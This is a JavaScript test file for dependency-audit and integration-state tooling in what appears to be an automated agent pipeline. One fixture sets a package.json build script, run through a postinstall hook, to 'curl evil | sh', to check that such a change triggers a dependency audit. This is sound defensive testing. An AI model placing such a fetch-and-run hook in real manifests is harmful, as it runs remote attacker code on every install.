// SPDX-License-Identifier: Apache-2.0
import assert from 'node:assert/strict';
import test from 'node:test';
import {
  dependencyFieldsChanged,
  dependencyRelevantSnapshot,
  skipsDependencyAuditForFile,
} from '../tools/dependency-diff.mjs';
import {
  isNonIntegratingRun,
  runHasNoOutputs,
  runIntegratedFromState,
} from '../tools/run-kind.mjs';
import { decide, buildAutopilotPollDigest, autopilotRunFromState } from '../tools/autopilot.mjs';
import {
  captureQueueIntegrationPrior,
  recordQueuePass,
} from '../tools/swarm/core-71.mjs';

test('finding-1 lifecycle hook snapshots whole scripts when build turns hostile', () => {
  const before = JSON.stringify({
    name: 'x',
    scripts: { postinstall: 'npm run build', build: 'echo ok' },
  });
  const after = JSON.stringify({
    name: 'x',
    scripts: { postinstall: 'npm run build', build: 'curl evil | sh' },
  });
  assert.equal(dependencyFieldsChanged(before, after), true);
  assert.equal(skipsDependencyAuditForFile('package.json', before, after), false);
});

test('finding-2 material snapshot includes bundleDependencies and peerDependenciesMeta', () => {
  const snap = dependencyRelevantSnapshot({
    bundleDependencies: ['a'],
    peerDependenciesMeta: { b: { optional: true } },
    dependenciesMeta: { c: { built: false } },
    pnpm: { overrides: { d: '1' } },
  });
  assert.deepEqual(snap.bundleDependencies, ['a']);
  assert.deepEqual(snap.peerDependenciesMeta, { b: { optional: true } });
  assert.deepEqual(snap.dependenciesMeta, { c: { built: false } });
  assert.deepEqual(snap.pnpm, { overrides: { d: '1' } });
  const before = JSON.stringify({ name: 'x', bundleDependencies: [] });
  const after = JSON.stringify({ name: 'x', bundleDependencies: ['pkg'] });
  assert.equal(dependencyFieldsChanged(before, after), true);
});

test('finding-1 scripts-only build change is inert without lifecycle hooks', () => {
  const before = JSON.stringify({ name: 'x', scripts: { build: 'good' } });
  const after = JSON.stringify({ name: 'x', scripts: { build: 'evil' } });
  assert.equal(dependencyFieldsChanged(before, after), false);
});

test('deleted package.json is not audit-skipped', () => {
  const before = JSON.stringify({ name: 'x', dependencies: { a: '1' } });
  assert.equal(dependencyFieldsChanged(before, null), true);
  assert.equal(skipsDependencyAuditForFile('package.json', before, null), false);
});

test('finding-15 partial integrationStatus is not integrated', () => {
  const state = {
    integratedFiles: ['a.mjs'],
    integratedAt: '2026-01-01T00:00:00Z',
    integrationStatus: 'partial',
    jobs: [{ id: 'j1', outputs: ['a.mjs'] }],
  };
  assert.equal(runIntegratedFromState(state), false);
  const run = autopilotRunFromState(state, 'run-1');
  assert.equal(run.integrated, false);
});

test('finding-16 job without outputs array is not read-only no-output run', () => {
  assert.equal(runHasNoOutputs({ jobs: [{ id: 'j1' }] }), false);
  assert.equal(runHasNoOutputs({ jobs: [{ id: 'j1', outputs: [] }] }), true);
  assert.equal(runIntegratedFromState({ jobs: [{ id: 'j1' }] }), false);
});

test('finding-17 failed retry-failed action does not count as retried', () => {
  const run = { id: 'r1', status: 'failed', counts: { failed: 1 } };
  const events = [
    { kind: 'action', action: 'retry-failed', run: 'r1', result: 'boom' },
  ];
  const d = decide(run, { events, now: Date.now() });
  assert.equal(d?.action, 'retry-failed');
});

test('finding-17 in-flight retry waits instead of failed blocker', () => {
  const run = { id: 'r1', status: 'failed', counts: { failed: 1 } };
  const events = [
    { kind: 'action', action: 'retry-failed', run: 'r1', result: 'ok' },
    { kind: 'run', id: 'r2', retryOf: 'r1', status: 'running' },
  ];
  const d = decide(run, { events, now: Date.now() });
  assert.equal(d?.action, 'wait');
});

test('finding-18 handled complete non-integrated run is not integrated', () => {
  const run = {
    id: 'r1',
    status: 'complete',
    handled: true,
    integrable: true,
    jobs: [{ id: 'j1', outputs: ['out.txt'] }],
  };
  const d = decide(run, { events: [], now: Date.now() });
  assert.equal(d, null);
});

test('finding-19 poll digest changes when ticket ledger input changes', async () => {
  const root = '/tmp-unused';
  const baseDeps = {
    readJournal: async () => [],
    loadRuns: async () => [],
    readPlan: async () => null,
    readTickets: async () => [{ id: 'T-1', status: 'ready' }],
  };
  const a = await buildAutopilotPollDigest(root, baseDeps);
  const b = await buildAutopilotPollDigest(root, {
    ...baseDeps,
    readTickets: async () => [{ id: 'T-1', status: 'done' }],
  });
  assert.notEqual(a.digest, b.digest);
});

test('finding-20 ask job id with real outputs is still integrating', () => {
  const state = { id: 'run-1', jobs: [{ id: 'ask-review', outputs: ['x.mjs'] }] };
  const manifest = { jobs: [{ id: 'ask-review', outputs: ['x.mjs'] }] };
  assert.equal(isNonIntegratingRun(state, manifest), false);
});

test('finding-21 recordQueuePass merges prior integratedHashes', () => {
  const manifest = { jobs: [{ id: 'a', outputs: ['f'] }] };
  const state = {
    integratedHashes: { 'f': 'newhash' },
    jobIntegration: { a: { status: 'integrated' } },
  };
  const prior = captureQueueIntegrationPrior({
    integratedHashes: { 'f': 'oldhash', 'g': 'keep' },
    integratedFiles: [],
    integratedNewFiles: [],
    jobIntegration: { a: { status: 'integrated' } },
    integrationPasses: [],
  });
  recordQueuePass(state, manifest, { integrated: ['a'] }, { prior, at: 't' });
  assert.equal(state.integratedHashes.f, 'newhash');
  assert.equal(state.integratedHashes.g, 'keep');
});

test('finding-22 integrated job is not overwritten by blocked security entry', () => {
  const manifest = { jobs: [{ id: 'a', outputs: ['f'] }, { id: 'b', outputs: ['g'] }] };
  const state = {
    jobIntegration: { a: { status: 'integrated', at: 't0' } },
  };
  const prior = captureQueueIntegrationPrior(state);
  recordQueuePass(state, manifest, {
    integrated: ['b'],
    securityBlocked: [{ job: 'a', blocks: [] }],
  }, { prior, at: 't1' });
  assert.equal(state.jobIntegration.a.status, 'integrated');
});

test('finding-23 final full check failure keeps integration partial', () => {
  const manifest = { jobs: [{ id: 'a', outputs: ['f'] }] };
  const state = { jobIntegration: { a: { status: 'integrated' } } };
  const prior = captureQueueIntegrationPrior(state);
  const complete = recordQueuePass(state, manifest, {
    integrated: ['a'],
    checkFailed: [{ job: '(final full check)', checks: ['test'] }],
  }, { prior, at: 't' });
  assert.equal(complete, false);
  assert.equal(state.integrationStatus, 'partial');
});
